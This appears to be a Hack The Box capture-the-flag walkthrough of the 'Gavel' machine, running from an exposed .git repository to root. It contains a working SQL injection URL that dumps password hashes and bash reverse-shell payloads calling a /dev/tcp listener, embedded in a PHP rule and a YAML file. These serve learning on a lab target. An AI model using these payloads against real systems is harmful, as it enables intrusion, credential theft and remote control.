# Gavel - Hack The Box Writeup
**Category:** Linux  
**Difficulty:** Medium 

## Enumeration

### Nmap

Initial scan revealed SSH and HTTP services.

```text
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
```

Browsing the website showed an auction/bidding platform.

---

## Directory Enumeration

Running Gobuster:

```bash
gobuster dir -u http://gavel.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Results:

```text
/index.php            (Status: 200)
/login.php            (Status: 200)
/register.php         (Status: 200)
/admin.php            (Status: 302)
/assets               (Status: 301)
/rules                (Status: 301)
/includes             (Status: 301)
/logout.php           (Status: 302)
/inventory.php        (Status: 302)
```

The `/assets` directory was accessible.

Inspection of the source code revealed that the application used:

```text
SB Admin 2 v4.1.3
```

No useful vulnerabilities were found for the theme itself.

---

## Further Enumeration

Running Gobuster with SecLists' `common.txt` wordlist revealed an exposed Git repository:

```bash
gobuster dir -u http://gavel.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

Interesting findings:

```text
.git/logs/
.git/config
.git/HEAD
.git/index
.git/
```

This immediately became the primary attack vector.

---

## Git Repository Disclosure

Dumping the repository allowed recovery of the application's source code.

During source code review I discovered:

### User Enumeration

A user email:

```text
sado@gavel.htb
```

### Admin Access Logic

Reviewing `admin.php` revealed that access required a cookie containing the role:

```text
auctioneer
```

Additionally, the application executed user-defined PHP code via:

```php
runkit_function_add()
```

inside the auction rule system.

This looked promising for later exploitation.

---

## Source Code Review

After recovering all commits using the Git repository, I reviewed the application files.

### Database Configuration

`includes/config.php`

```php
<?php

define('DB_HOST', 'localhost');
define('DB_NAME', 'gavel');
define('DB_USER', 'gavel');
define('DB_PASS', 'gavel');

define('ROOT_PATH', dirname(__DIR__));

$basePath = rtrim(dirname($_SERVER['SCRIPT_NAME']), '/');
define('BASE_URL', $basePath);
define('ASSETS_URL', $basePath . '/assets');
```

No immediately useful credentials were found beyond the local database credentials.

---

# SQL Injection

After spending some time reviewing the application and its code,
a vulnerable parameter was discovered in inventory.php vulnerable to PDO SQL injections:

```text
/inventory.php?user_id=
```
After a lot of research and testing,
the following payload successfully dumped usernames and password hashes:

```text
http://gavel.htb/inventory.php?user_id=x`+FROM+(SELECT+group_concat(username,0x3a,password)+AS+`%27x`+FROM+users)y;--+-&sort=\?;--+-%00
```

Output:

```text
auctioneer:$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS
Amongus:$2y$10$MijSqvjROrHTwWtZghP8v.8e.RBzyDBQPrjGTs/lq0ZgsxRq0GjIi
0xpa1n:$2y$10$f5FXLii5Yq7gwfx877ltoOD9Jnd11BQq6YXJuyxtLTbQ32vTfguB.
123123123:$2y$10$NXD9jvwfeCdyhVzy0UHVSuyXCaTJnFRyeH/5VR7Dsxvif3Do7heIW
```

Cracking the hashes revealed:

```text
auctioneer : midnight1
```

---

# Remote Code Execution

Logging into the admin panel as `auctioneer` exposed the auction rule editor.

Earlier source code review had shown that the rule field was executed through `runkit_function_add()`.

This meant arbitrary PHP code execution was possible.

I inserted a reverse shell payload:

```php
system('bash -c "bash -i >& /dev/tcp/10.10.15.218/4444 0>&1"');
return true;
```

Started a listener:

```bash
nc -lvnp 4444
```

Then saved the rule.

A reverse shell connected back successfully.

---

# User Access

Since we had recovered the auctioneer password earlier:

```text
auctioneer : midnight1
```

I switched users:

```bash
su auctioneer
```

Access obtained.

---

# Privilege Escalation Enumeration

Interesting findings:

### Writable Session Directory

```text
/var/lib/php/sessions
```

### Group Membership

```bash
id
```

Output showed:

```text
groups=1001(gavel-seller)
```

### Interesting Files

```text
/run/gaveld.sock
/usr/local/bin/gavel-util
```

---

## Investigating gaveld

Checking running processes:

```bash
ps aux
```

Interesting process:

```text
root  939  ...  /opt/gavel/gaveld
```

The daemon was running as root.

The socket:

```text
/run/gaveld.sock
```

was writable by the `gavel-seller` group.

This meant we could communicate with a root-owned service.

---

## Understanding the Attack Surface

The helper utility:

```text
/usr/local/bin/gavel-util
```

allowed interaction with the daemon through the socket.

The daemon executed auction definitions stored as YAML files.

Unfortunately several security filters existed:

- Commands were heavily restricted
- File writes were limited
- Access was mostly constrained to `/opt/gavel`

My initial idea was creating a SUID binary through Python.

This failed because modern Linux systems require executable files to actually contain executable code in order for the SUID bit to be useful.

---

## YAML Execution Test

I created a YAML file to verify code execution:

```yaml
name: "Reverse"
description: "Test"
image: "test.jpg"
price: 1
rule_msg: "Test"
rule: |
  $cmd = '/bin/bash -c "bash -i >& /dev/tcp/10.10.15.218/4446 0>&1"';
  $fp = popen($cmd, 'r');

  if($fp) {
    file_put_contents('/opt/gavel/reverse.txt', 'reverse attempted');
    pclose($fp);
  }

  return false;
```

Saved as:

```text
/tmp/reverse_popen.yaml
```

This confirmed that code execution was occurring, but the security restrictions still prevented straightforward privilege escalation.

---

# Bypassing the Restrictions

While investigating the daemon configuration, I found:

```text
/opt/gavel/config/php/php.ini
```

This file contained the PHP restrictions enforced by the service.

Since I could interact with the daemon and write controlled content, I used the append functionality to overwrite the PHP configuration and disable the imposed restrictions.

After removing the restrictions, creating a privileged shell became trivial.

I generated a SUID-enabled root shell and executed it to obtain root privileges.

---

# Root

After bypassing the PHP restrictions:

```bash
./rootbash -p
```

Root shell obtained.

Retrieve the root flag:

```bash
cat /root/root.txt
```

---

# Lessons Learned

- Always check for exposed `.git` repositories.
- Source code review often reveals authentication and authorization logic.
- Never trust role validation that relies solely on client-controlled cookies.
- Custom daemons communicating over Unix sockets frequently create privilege escalation opportunities.
- Writable root-owned service sockets should always be investigated carefully.
- Configuration files are often easier to abuse than the application's intended functionality.

---

**Personal Opinion:** The initial foothold was relatively straightforward once the exposed Git repository was discovered and related documentations were found for the SQL injection, but the privilege escalation required a little more investigation. Understanding how `gaveld` interacted with YAML files and PHP restrictions was the key to obtaining root.
